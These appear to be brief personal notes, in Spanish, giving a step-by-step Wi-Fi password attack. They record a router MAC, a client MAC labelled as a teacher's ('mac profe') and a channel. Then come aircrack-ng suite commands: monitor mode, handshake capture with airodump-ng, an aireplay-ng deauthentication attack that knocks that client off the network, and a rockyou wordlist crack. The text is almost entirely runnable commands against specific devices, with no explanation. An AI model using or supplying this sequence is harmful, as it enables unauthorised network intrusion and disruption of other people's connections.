```
MAC del modem = 38:FB:14:DD:13:B0
```

```
mac profe = 06:CA:0D:33:40:B7
```

```
channel = 1
```

```bash
airmon-ng stop wlan0mon
```

```bash
airmon-ng start wlan0 [channel]
```

```bash
airodump-ng -c 1 --bssid 38:FB:14:DD:13:B0 -w hack wlan0mon
```

```bash
aireplay-ng -0 9 -a 38:FB:14:DD:13:B0 -c 06:CA:0D:33:40:B7 wlan0mon
```

```bash
aircrack-ng -b 38:FB:14:DD:13:B0 -w /usr/share/wordlists/rockyou.txt hack-01.cap
```


![[Pasted image 20241122075809.png]]


